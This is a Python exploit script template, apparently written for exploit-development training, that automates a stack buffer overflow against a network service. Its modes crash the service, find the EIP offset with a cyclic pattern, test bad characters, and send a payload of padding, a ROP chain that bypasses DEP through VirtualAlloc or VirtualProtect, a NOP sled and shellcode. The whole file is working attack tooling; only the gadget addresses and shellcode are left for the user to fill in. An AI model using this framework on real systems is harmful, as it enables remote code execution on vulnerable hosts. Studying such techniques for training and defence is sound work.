#!/usr/bin/env python3
"""DEP bypass via ROP chain (VirtualAlloc / VirtualProtect).

The ROP chain and shellcode come from files -- built by the emitter on Kali,
or assembled manually. This script just does the framing and delivery.

Workflow:
  1. Set MODE = "crash" / "pattern" / "offset" / "eip" / "badchars" as usual
  2. Build ROP chain (mona / manual), save as raw bytes in a file
  3. Build shellcode with the emitter, get shellcode.bin
  4. Set MODE = "exploit", point ROP_FILE and SHELLCODE_FILE at your files

Run on Kali:
  python3 dep_bypass.py
"""
import socket
import struct
import sys

# ============================================================
# FILL THESE IN
# ============================================================
MODE = "crash"          # crash | pattern | offset | eip | badchars | exploit

TARGET_HOST = "192.168.x.x"
TARGET_PORT = 9999
PROTOCOL    = "tcp"     # tcp | udp | file
OUTPUT_FILE = "payload.bin"

PREFIX = b""
SUFFIX = b""

CRASH_LENGTH   = 5000
PATTERN_LENGTH = 5000
OFFSET = 0
BADCHARS = [0x00]

# DEP bypass specifics
# Option A: ROP chain from a file (raw packed bytes)
ROP_FILE = ""           # path to rop_chain.bin

# Option B: ROP chain inline (list of gadget addresses)
# The script packs these as little-endian DWORDs automatically.
ROP_CHAIN = [
    # Example VirtualAlloc chain:
    # 0x12345678,   # gadget: pop eax; ret
    # 0xdeadbeef,   # VirtualAlloc IAT entry
    # ...
]

# After the ROP chain executes, it should jump to the shellcode.
# If VirtualAlloc returns to ESP+N where shellcode lands, you're set.
# Otherwise adjust ALIGN_AFTER_ROP.
ALIGN_AFTER_ROP = b""  # extra bytes between ROP chain end and shellcode
NOP_SLED = 32

# Shellcode -- three options (tried in order):
#   1. SHELLCODE_ASM: Keystone assembly (requires keystone-engine)
#   2. SHELLCODE_FILE: path to shellcode.bin
#   3. SHELLCODE: raw bytes pasted inline
SHELLCODE_ASM = r"""
"""
SHELLCODE_FILE = ""
SHELLCODE = b""


# ============================================================
# TRANSPORT (same as stack_bof.py)
# ============================================================
def send_payload(data):
    payload = PREFIX + data + SUFFIX
    print(f"[*] Payload: {len(payload)} bytes (data: {len(data)})")

    if PROTOCOL == "file":
        with open(OUTPUT_FILE, "wb") as f:
            f.write(payload)
        print(f"[+] Written to {OUTPUT_FILE}")
        return b""

    if PROTOCOL == "tcp":
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(5.0)
            s.connect((TARGET_HOST, TARGET_PORT))
            # banner = s.recv(1024)
            s.sendall(payload)
            try:
                return s.recv(1024)
            except socket.timeout:
                return b""

    if PROTOCOL == "udp":
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.sendto(payload, (TARGET_HOST, TARGET_PORT))
        return b""

    raise ValueError(f"Unknown protocol: {PROTOCOL}")


def cyclic_pattern(length):
    out = bytearray()
    for a in range(26):
        for b in range(26):
            for c in range(10):
                out.append(0x41 + a)
                out.append(0x61 + b)
                out.append(0x30 + c)
                if len(out) >= length:
                    return bytes(out[:length])
    return bytes(out[:length])


def cyclic_find(value):
    pat = cyclic_pattern(max(PATTERN_LENGTH, 20000))
    needle = struct.pack("<I", value)
    off = pat.find(needle)
    if off < 0:
        print(f"[-] Value 0x{value:08x} not found in pattern")
    else:
        print(f"[+] Offset: {off}")
    return off


def badchar_sequence():
    return bytes(i for i in range(256) if i not in BADCHARS)


def pack_rop(chain):
    return b"".join(struct.pack("<I", addr) for addr in chain)


def load_file(path, fallback=b""):
    if not path:
        return fallback
    with open(path, "rb") as f:
        return f.read()


# ============================================================
# SHELLCODE ASSEMBLY (Keystone)
# ============================================================
def assemble_ks(asm_text):
    """Assemble x86 with Keystone. Returns bytes or exits on error."""
    try:
        from keystone import Ks, KS_ARCH_X86, KS_MODE_32
    except ImportError:
        print("[-] keystone-engine not installed (pip install keystone-engine)")
        sys.exit(1)
    ks = Ks(KS_ARCH_X86, KS_MODE_32)
    cleaned = asm_text.replace("jmp short ", "jmp ")
    try:
        encoding, count = ks.asm(cleaned)
    except Exception as e:
        print(f"[-] Assembly failed: {e}")
        sys.exit(1)
    sc = bytes(encoding)
    print(f"[+] Assembled {count} instructions -> {len(sc)} bytes")
    return sc


def get_shellcode():
    """Resolve shellcode from ASM, file, or inline bytes (in priority order)."""
    asm = SHELLCODE_ASM.strip()
    if asm:
        return assemble_ks(asm)
    if SHELLCODE_FILE:
        with open(SHELLCODE_FILE, "rb") as f:
            sc = f.read()
        print(f"[+] Loaded {len(sc)} bytes from {SHELLCODE_FILE}")
        return sc
    if SHELLCODE:
        return SHELLCODE
    print("[-] No shellcode. Set SHELLCODE_ASM, SHELLCODE_FILE, or SHELLCODE.")
    sys.exit(1)


# ============================================================
# MODES
# ============================================================
def do_crash():
    print(f"[*] Sending {CRASH_LENGTH} bytes...")
    send_payload(b"A" * CRASH_LENGTH)

def do_pattern():
    print(f"[*] Sending cyclic pattern ({PATTERN_LENGTH} bytes)...")
    send_payload(cyclic_pattern(PATTERN_LENGTH))

def do_offset():
    print("[*] Paste the EIP value from the debugger (hex):")
    raw = input("    EIP = ").strip()
    cyclic_find(int(raw, 16))

def do_eip():
    print(f"[*] Sending offset={OFFSET} + EIP=0x42424242")
    buf = b"A" * OFFSET
    buf += struct.pack("<I", 0x42424242)
    buf += b"C" * 500
    send_payload(buf)

def do_badchars():
    bc = badchar_sequence()
    print(f"[*] Sending badchar test ({len(bc)} test bytes)")
    buf = b"A" * OFFSET
    buf += struct.pack("<I", 0x42424242)
    buf += bc
    send_payload(buf)

def do_exploit():
    # Load ROP chain
    rop = load_file(ROP_FILE)
    if not rop and ROP_CHAIN:
        rop = pack_rop(ROP_CHAIN)
    if not rop:
        print("[-] No ROP chain. Set ROP_FILE or ROP_CHAIN.")
        sys.exit(1)

    # Load shellcode
    sc = get_shellcode()

    print(f"[*] ROP chain: {len(rop)} bytes ({len(rop)//4} gadgets)")
    print(f"[*] Shellcode: {len(sc)} bytes")

    # Layout: [padding][ROP chain][alignment][NOP sled][shellcode]
    # The first DWORD of the ROP chain overwrites saved EIP.
    buf = b"A" * OFFSET
    buf += rop
    buf += ALIGN_AFTER_ROP
    buf += b"\x90" * NOP_SLED
    buf += sc
    send_payload(buf)


MODES = {
    "crash": do_crash,
    "pattern": do_pattern,
    "offset": do_offset,
    "eip": do_eip,
    "badchars": do_badchars,
    "exploit": do_exploit,
}

if __name__ == "__main__":
    mode = MODE.lower()
    if mode not in MODES:
        print(f"[-] Unknown mode: {mode}")
        sys.exit(1)
    MODES[mode]()
